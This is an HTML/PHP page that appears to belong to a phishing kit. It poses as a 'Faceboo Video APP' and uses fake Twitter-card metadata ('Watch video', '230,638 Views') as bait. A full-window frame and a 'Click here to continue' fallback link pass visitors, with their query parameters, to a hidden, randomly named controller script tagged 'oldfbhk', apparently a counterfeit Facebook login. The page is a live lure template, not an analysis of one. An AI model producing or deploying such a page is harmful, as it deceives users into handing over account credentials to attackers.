
	<html> 
	<head> 
	<title>Faceboo Video APP</title>
		
		<meta name="twitter:card" content="summary" />
		<meta name="twitter:site" content="@" />
		<meta name="twitter:title" content="Watch video @" />
		<meta name="twitter:description" content="230,638 Views " />
		<meta name="twitter:image" content="https://avatars.io/twitter/" />
	
	</head>
	<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
	<frame name="main" src="../.././public/CONTROLLERd7044f50-978c-4167-a47e-85cfae2ca2b6.php?source=.%2Fpublic%2FACCESSSe42653f3-0268-491e-aa75-44e522da55ae&lan=oldfbhk&<?php echo http_build_query($_GET); ?>"> <noframes> 
	<body bgcolor="#FFFFFF" text="#000000"> 
	<a href="../.././public/CONTROLLERd7044f50-978c-4167-a47e-85cfae2ca2b6.php?source=.%2Fpublic%2FACCESSSe42653f3-0268-491e-aa75-44e522da55ae&lan=oldfbhk&<?php echo http_build_query($_GET); ?>">Click here to continue</a> 
	</body> 
	</noframes> 
	</html> 
   